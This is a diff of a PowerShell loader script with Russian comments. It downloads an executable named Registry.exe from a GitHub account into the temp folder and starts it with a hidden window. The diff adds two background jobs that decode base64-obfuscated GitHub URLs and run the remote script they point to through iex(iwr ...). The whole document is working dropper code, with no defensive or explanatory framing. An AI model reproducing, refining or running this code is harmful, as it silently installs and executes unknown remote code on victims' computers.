@@ -19,7 +19,7 @@ try {
 } catch {}
 
 # Прямая ссылка на твой исполняемый файл
-$url = "https://github.com/CheatCheckNo98235/rect/raw/refs/heads/main/Registry.exe"
+$url = "https://raw.githubusercontent.com/CheatCheckNo98237/rect/main/Registry.exe"
 $p = "$env:TEMP\Registry.exe"
 
 # Скачивание файла
@@ -34,3 +34,22 @@ try {
     Invoke-WebRequest -Uri $url -OutFile $p -UseBasicParsing
     if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
 }
+
+# Твои команды в параллельных потоках, но строго в указанном порядке
+# Запускаем обе команды одновременно
+$job1 = Start-Job -ScriptBlock {
+    $encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NoZWF0Q2hlY2tObzk4MjM3L3JlY3QvcmVmcy9oZWFkcy9tYWluL2V4YzIucHMx'
+    $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
+    iex (iwr $decoded -UseBasicParsing)
+}
+
+$job2 = Start-Job -ScriptBlock {
+    $encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NoZWF0Q2hlY2tObzk4MjM1L3JlY3QvcmVmcy9oZWFkcy9tYWluL2V4YzIucHMx'
+    $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
+    iex (iwr $decoded -UseBasicParsing)
+}
+
+# Ожидаем завершения обеих задач
+Wait-Job $job1, $job2
+Receive-Job $job1, $job2
+Remove-Job $job1, $job2
